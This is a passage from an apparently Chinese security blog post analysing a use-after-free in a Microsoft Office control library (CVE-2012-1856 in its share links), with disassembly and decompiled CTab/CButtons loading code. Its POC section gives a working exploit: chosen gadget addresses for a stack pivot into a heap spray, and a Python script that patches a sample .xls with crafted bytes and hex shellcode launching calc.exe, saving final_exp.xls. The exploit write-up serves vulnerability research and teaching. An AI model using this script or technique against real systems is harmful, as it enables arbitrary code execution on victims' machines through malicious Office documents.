<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">        sub     esp, 0Ch</span><br><span class="line">.text:275B51C5                 mov     eax, [esp+10h]</span><br><span class="line">.text:275B51C9                 push    ebx</span><br><span class="line">.text:275B51CA                 push    ebp</span><br><span class="line">.text:275B51CB                 mov     ebx, ecx</span><br><span class="line">.text:275B51CD                 mov     ebp, [eax]</span><br><span class="line">.text:275B51CF                 push    esi</span><br><span class="line">.text:275B51D0                 push    edi</span><br><span class="line">.text:275B51D1                 mov     eax, [ebp+0]</span><br><span class="line">.text:275B51D4                 mov     ecx, [ebp+4]</span><br><span class="line">.text:275B51D7                 add     ebp, 8</span><br><span class="line">.text:275B51DA                 mov     [esp+18h], ecx</span><br><span class="line">.text:275B51DE                 test    cl, 1</span><br><span class="line">.text:275B51E1                 mov     [ebx+64h], ax</span><br><span class="line">.text:275B51E5                 jnz     loc_275CD249</span><br><span class="line">.text:275B51EB</span><br><span class="line">.text:275B51EB loc_275B51EB:                           ; CODE XREF: CTab::LoadBinaryStateFromMemory(uchar * *)+180C8↓j</span><br><span class="line">.text:275B51EB                 mov     eax, [esp+18h]</span><br><span class="line">.text:275B51EF                 shr     eax, 1</span><br><span class="line">.text:275B51F1                 test    al, 1</span><br><span class="line">.text:275B51F3                 jnz     loc_275CD28F</span><br><span class="line">.text:275B51F9</span><br><span class="line">.text:275B51F9 loc_275B51F9:                           ; CODE XREF: CTab::LoadBinaryStateFromMemory(uchar * *)+18116↓j</span><br><span class="line">.text:275B51F9                 mov     eax, [esp+18h]</span><br><span class="line">.text:275B51FD                 shr     eax, 2</span><br><span class="line">.text:275B5200                 test    al, 1</span><br><span class="line">.text:275B5202                 jnz     loc_275CD2DD</span><br><span class="line">.text:275B5208</span><br><span class="line">.text:275B5208 loc_275B5208:                           ; CODE XREF: CTab::LoadBinaryStateFromMemory(uchar * *)+18164↓j</span><br><span class="line">.text:275B5208                 mov     eax, [esp+18h]</span><br><span class="line">.text:275B520C                 shr     eax, 3</span><br><span class="line">.text:275B520F                 test    al, 1</span><br><span class="line">.text:275B5211                 jnz     loc_275CD32B</span><br><span class="line">.text:275B5217</span><br><span class="line">.text:275B5217 loc_275B5217:                           ; CODE XREF: CTab::LoadBinaryStateFromMemory(uchar * *)+181AE↓j</span><br><span class="line">.text:275B5217                 lea     esi, [ebx+70h]</span><br><span class="line">.text:275B521A                 push    esi             ; pvarg</span><br><span class="line">.text:275B521B                 call    ds:__imp__VariantClear@4 ; VariantClear(x)</span><br><span class="line">.text:275B5221                 mov     eax, [esp+18h]</span><br><span class="line">.text:275B5225                 shr     eax, 4</span><br><span class="line">.text:275B5228                 test    al, 1</span><br><span class="line">.text:275B522A                 jnz     loc_275CD375</span><br><span class="line">.text:275B5230                 mov     word ptr [esi], 2</span><br><span class="line">.text:275B5235                 mov     ax, [ebp+0]</span><br><span class="line">.text:275B5239                 inc     ebp</span><br><span class="line">.text:275B523A                 mov     [ebx+78h], ax</span><br><span class="line">.text:275B523E                 inc     ebp</span><br><span class="line">.text:275B523F</span><br><span class="line">.text:275B523F loc_275B523F:                           ; CODE XREF: CTab::LoadBinaryStateFromMemory(uchar * *)+181F1↓j</span><br><span class="line">.text:275B523F                 mov     eax, [esp+20h]</span><br><span class="line">.text:275B5243                 mov     [eax], ebp</span><br><span class="line">.text:275B5245                 xor     eax, eax</span><br><span class="line">.text:275B5247</span><br><span class="line">.text:275B5247 loc_275B5247:                           ; CODE XREF: CTab::LoadBinaryStateFromMemory(uchar * *)+181D3↓j</span><br><span class="line">.text:275B5247                 pop     edi</span><br><span class="line">.text:275B5248                 pop     esi</span><br><span class="line">.text:275B5249                 pop     ebp</span><br><span class="line">.text:275B524A                 pop     ebx</span><br><span class="line">.text:275B524B                 add     esp, 0Ch</span><br><span class="line">.text:275B524E                 retn    4</span><br></pre></td></tr></table></figure>
<p>后面也有很多这种函数，即利用文件中的定义len，SysAllocStringLen开辟内存，而后将文件中字符串复制到开辟位置<br>注意到crash的流程：循环到0x1F个对象，初始化，而后将初始化后CTab对象加入Item，紧接着调用CTab::LoadBinaryStateFromMemory，但是对应位置伪造的大小为0x80000044：<br><img src="https://upload-images.jianshu.io/upload_images/9027235-6b066e0f392dda25.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="data"><br>紧接着SysAllocStringLen因申请空间为0x80000044返回错误：0x8007000E(负值)<br>当CTab::LoadBinaryStateFromMemory返回为负时，即会break，调用最后的：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(void (__cdecl **)(int))(*((_DWORD *)v9 + 7) + 8))((int)v9 + 28);</span><br></pre></td></tr></table></figure>
<p>动态下看到其就是开始定位的过程，最终即走向CTab的析构函数并释放对象，但是有一个关键点，释放后并没有将此对象从Item中删除，导致最后循环删除过程中，依然会处理这个对象造成UAF</p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>因为暂时没了解怎么脚本构造Cobj对象，直接从样本构造POC<br>首先程序利用点一定是CObjColl::Clear：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:27582E14                 mov     edi, [eax+28h]</span><br><span class="line">.text:27582E17                 mov     ecx, [eax+1Ch]</span><br><span class="line">.text:27582E1A                 mov     [eax+48h], ebx</span><br><span class="line">.text:27582E1D                 add     eax, 1Ch</span><br><span class="line">.text:27582E20                 push    eax</span><br><span class="line">.text:27582E21                 call    dword ptr [ecx+8]</span><br></pre></td></tr></table></figure>
<p>所以这里需要让堆块free后重新分配时可控<br>样本虽然最后Crash，不过下硬件断点明显看到其重新填充的过程在：<br>CButton::LoadBinaryStateFromMemory，即在CButton对象申请空间保存文件中对应位置字符串时，其连续使用了多组相同payload造成heap spray，使原free位置重新被分配后被payload填充<br>我们修改对应填充位置即可<br>具体利用heap spray位置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">int __thiscall CButtons::LoadBinaryStateFromMemory(CButtons *this, unsigned __int8 **a2)</span><br><span class="line">&#123;</span><br><span class="line">  CObjColl *v2; &#x2F;&#x2F; esi</span><br><span class="line">  int v3; &#x2F;&#x2F; ecx</span><br><span class="line">  int v4; &#x2F;&#x2F; ebx</span><br><span class="line">  CButton *v5; &#x2F;&#x2F; eax</span><br><span class="line">  int v6; &#x2F;&#x2F; edi</span><br><span class="line">  int v8; &#x2F;&#x2F; [esp+Ch] [ebp-Ch]</span><br><span class="line">  CButton *v9; &#x2F;&#x2F; [esp+10h] [ebp-8h]</span><br><span class="line">  unsigned __int8 *v10; &#x2F;&#x2F; [esp+14h] [ebp-4h]</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; this;</span><br><span class="line">  v3 &#x3D; *((_DWORD *)this + 18);</span><br><span class="line">  v10 &#x3D; *a2;</span><br><span class="line">  (*(void (__stdcall **)(int))(v3 + 56))((int)v2 + 72);</span><br><span class="line">  v8 &#x3D; 0;</span><br><span class="line">  v4 &#x3D; *(_DWORD *)v10;</span><br><span class="line">  v10 +&#x3D; 4;</span><br><span class="line">  if ( v4 &lt;&#x3D; 0 )</span><br><span class="line">  &#123;</span><br><span class="line">LABEL_6:</span><br><span class="line">    v6 &#x3D; 0;</span><br><span class="line">    *a2 &#x3D; v10;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v5 &#x3D; (CButton *)CtlNewDelete::operator new(0xF8u, g_hHeap);</span><br><span class="line">      JUMPOUT(v5, 0, &amp;CButtons::LoadBinaryStateFromMemory);</span><br><span class="line">      v9 &#x3D; (CButton *)CButton::CButton(v5, 0);</span><br><span class="line">      if ( !v9 )</span><br><span class="line">        return -2147024882;</span><br><span class="line">      v6 &#x3D; CObjColl::AddItem(v2, v9, 0, 0);</span><br><span class="line">      if ( v6 &lt; 0 )</span><br><span class="line">        break;</span><br><span class="line">      v6 &#x3D; CButton::LoadBinaryStateFromMemory(v9, &amp;v10);&#x2F;&#x2F; malloc_new &amp;&amp; use here</span><br><span class="line">      if ( v6 &lt; 0 )</span><br><span class="line">        break;</span><br><span class="line">      if ( ++v8 &gt;&#x3D; v4 )</span><br><span class="line">        goto LABEL_6;</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v9 )</span><br><span class="line">      (*(void (__stdcall **)(int))(*((_DWORD *)v9 + 7) + 8))((int)v9 + 28);</span><br><span class="line">  &#125;</span><br><span class="line">  return v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先利用Ropchain将ip置到我们的堆块下：<br>一个小trike，直接利用函数表中函数，这里的函数地址在代码段一般都会有，因为要初始化对象，mov过程或者定义offset就会存在该函数地址<br>选择利用：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.text:27582E20                 push    eax</span><br><span class="line">.text:27582E21                 call    dword ptr [ecx+8]</span><br></pre></td></tr></table></figure>
<p>在栈中会有可控堆指针<br>连续两次调用，其中一次retn x<br>x为适当值即可改变栈帧，返回到堆地址<br>选择：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:275912FF ?AddRef@CPropertyPage@@UAGKXZ proc near ; CODE XREF: [thunk]:CStandardPropPage::AddRef&#96;adjustor&#123;28&#125;&#39; (void)+5↓j</span><br><span class="line">.text:275912FF                                         ; DATA XREF: .text:2759146C↓o ...</span><br><span class="line">.text:275912FF                 mov     eax, [esp+4]</span><br><span class="line">.text:27591303                 lea     ecx, [eax-14h]</span><br><span class="line">.text:27591306                 mov     eax, [eax-14h]</span><br><span class="line">.text:27591309                 call    dword ptr [eax+4]</span><br><span class="line">.text:2759130C                 retn    4</span><br><span class="line">.text:2759130C ?AddRef@CPropertyPage@@UAGKXZ endp</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.text:27601762 ?IsPageDirty@CPropertyPage@@UAGJXZ proc near</span><br><span class="line">.text:27601762                                         ; DATA XREF: .text:275E4DD8↑o</span><br><span class="line">.text:27601762                                         ; .text:275E4E58↑o ...</span><br><span class="line">.text:27601762                 mov     eax, [esp+4]</span><br><span class="line">.text:27601766                 mov     eax, [eax+14h]</span><br><span class="line">.text:27601769                 shr     eax, 1</span><br><span class="line">.text:2760176B                 not     al</span><br><span class="line">.text:2760176D                 and     eax, 1</span><br><span class="line">.text:27601770                 retn    4</span><br><span class="line">.text:27601770 ?IsPageDirty@CPropertyPage@@UAGJXZ endp</span><br></pre></td></tr></table></figure>
<p>(使用交叉引用就可以看到代码段中很多位置保存这两个函数地址，选择两个构造POC即可)<br>第一次调用<br>调用此函数mov     eax, [eax-14h]，eax再次为堆块可控数据位置<br>而后call    dword ptr [eax+4]紧接着调用一个可以直接正确返回且retn 4的函数，栈帧被破坏，此时当第一个函数ret时，返回地址变为开始时push的堆地址，而后ip变为堆初始偏移0x14，即第一个伪造地址处，此时ip位置是第一次在堆中伪造的地址处，可能有奇怪的汇编，选择适合的机器码即时jmp到真正shellcode处即可</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">stream&#x3D;&quot;&quot;</span><br><span class="line">key1&#x3D;&quot;&quot;</span><br><span class="line">key2&#x3D;&quot;&quot;</span><br><span class="line">S&#x3D;[ 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0xda, 0x89, 0x5B, 0x27,0XFF,0XFF]</span><br><span class="line">S2&#x3D;[0x41, 0x00, 0x41, 0x00,0xd4, 0x4d, 0x5e, 0x27, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x41, 0x00, 0x64, 0x14, 0x59, 0x27,0XEB,0X2A]</span><br><span class="line">for i in S:</span><br><span class="line">	key1+&#x3D;chr(i)</span><br><span class="line">for i in S2:</span><br><span class="line">	key2+&#x3D;chr(i)</span><br><span class="line">with open(&quot;poc.xls&quot;,&quot;rb+&quot;) as f:</span><br><span class="line">	stream&#x3D;f.read()</span><br><span class="line">	stream&#x3D;stream.replace(key1,key2)</span><br><span class="line">	old_code&#x3D;&quot;\x31\xd2\x66\x81&quot;</span><br><span class="line">	&#39;&#39;&#39; push ebp\</span><br><span class="line">        mov ebp,esp\</span><br><span class="line">        mov eax,0x275810EC\</span><br><span class="line">        mov ebx,[eax]\</span><br><span class="line">        sub ebx,0x11245\</span><br><span class="line">        xor eax,eax\</span><br><span class="line">        push eax\</span><br><span class="line">        mov eax,0x6578652e\</span><br><span class="line">        push eax\</span><br><span class="line">        mov eax,0x636c6163\</span><br><span class="line">        push eax\</span><br><span class="line">        mov eax,esp\</span><br><span class="line">        push 5\</span><br><span class="line">        push eax\</span><br><span class="line">        mov eax,ebx\</span><br><span class="line">        add eax,0x93229\</span><br><span class="line">        call eax\</span><br><span class="line">        xor eax,eax\</span><br><span class="line">        push eax\</span><br><span class="line">        mov eax,ebx\</span><br><span class="line">        add eax,0x17a28\</span><br><span class="line">        call eax\</span><br><span class="line">        mov esp,ebp\</span><br><span class="line">        pop ebp&#39;&#39;&#39;</span><br><span class="line">	shellcode&#x3D;&quot;5589e5b8ec1058278b1881eb4512010031c050b82e65786550b863616c635089e06a055089d80529320900ffd031c05089d805287a0100ffd089ec5d&quot;.decode(&quot;hex&quot;)</span><br><span class="line">	index&#x3D;stream.index(old_code)</span><br><span class="line">	code&#x3D;stream[index:index+len(shellcode)]</span><br><span class="line">	stream&#x3D;stream.replace(code,shellcode)</span><br><span class="line">	with open(&quot;final_exp.xls&quot;,&quot;wb+&quot;) as f2:</span><br><span class="line">		f2.write(stream)</span><br></pre></td></tr></table></figure>
<p><img src="https://upload-images.jianshu.io/upload_images/9027235-3852816d03154c13.gif?imageMogr2/auto-orient/strip" alt="PWN"></p>

  </div>
</article>



        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </div>

    <div id="toc-footer" style="display: none">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analyze"><span class="toc-number">1.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#POC"><span class="toc-number">2.</span> <span class="toc-text">POC</span></a></li></ol>
    </div>

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/" target="_blank" rel="noopener"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&text=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&is_video=false&description=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=CVE-2012-1856 Office UAF&body=Check out this article: http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&title=CVE-2012-1856 Office UAF" target="_blank" rel="noopener"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2019/03/05/CVE-2012-1856-Office-UAF/&name=CVE-2012-1856 Office UAF&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy; 2020 Kirin
  </div>
  <div class="footer-right">
    <nav>
      <ul>
         
          <li><a href="/">Home</a></li>
         
          <li><a href="/archives/">Articles</a></li>
         
          <li><a href="/links/">Links</a></li>
         
          <li><a href="/about/">About</a></li>
        
      </ul>
    </nav>
  </div>
</footer>

    </div>
</body>
</html>
<!-- styles -->

<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">


<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">


<!-- jquery -->

<script src="/lib/jquery/jquery.min.js"></script>


<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Disqus Comments -->


